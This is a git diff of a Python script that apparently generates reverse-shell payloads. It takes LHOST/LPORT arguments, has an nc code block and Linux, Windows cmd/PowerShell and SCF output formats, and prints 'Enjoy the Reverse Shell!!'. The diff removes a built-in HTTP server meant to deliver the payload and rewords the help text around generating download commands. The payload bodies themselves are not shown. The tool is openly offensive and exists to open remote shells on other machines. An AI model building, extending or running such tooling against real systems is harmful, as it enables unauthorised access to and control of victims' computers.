@@ -2,8 +2,6 @@
 import sys
 import argparse
 import os
-import http.server
-import socketserver
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -31,7 +29,7 @@ parser.add_argument('-i','--ipaddr', type=str,help='LHOST',required=True)
 parser.add_argument('-p','--port', type=int ,help='LPORT [Default 9001]',default=9001)
 parser.add_argument('-o','--out', type=str ,help='Output File Name [Excluding (.)extension Extension][OPTIONAL]',default="autorev")
 parser.add_argument('-f','--format',type=str,help='Define Format for generator [lin | win[c/p](c = cmd | p = powershell) | scf][Default=lin]',default='lin')
-parser.add_argument('-s','--server',type=int,help='Define Port for http server (Default 80)]',default=80)
+parser.add_argument('-s','--server',type=int,help='Port to use for generating commands (http://[your-ip]:[PORT]) (Default 80)',default=80)
 args = parser.parse_args()
 # nc code
 script = f'''
@@ -163,11 +161,3 @@ elif format == 'scf':
 else:
     print("Only [lin | win | scf] formats are available")
 
-# Creating a portable server
-try:
-    Handler = http.server.SimpleHTTPRequestHandler
-    print(f'{bcolors.WARNING}✅ After Getting the reverse shell please kill it with Ctrl+C{bcolors.OKGREEN}')
-    with socketserver.TCPServer((args.ipaddr, args.server), Handler) as httpd:
-        httpd.serve_forever()
-except:
-    print(f'{bcolors.WARNING}Enjoy the Reverse Shell!!😎{bcolors.ENDC}')
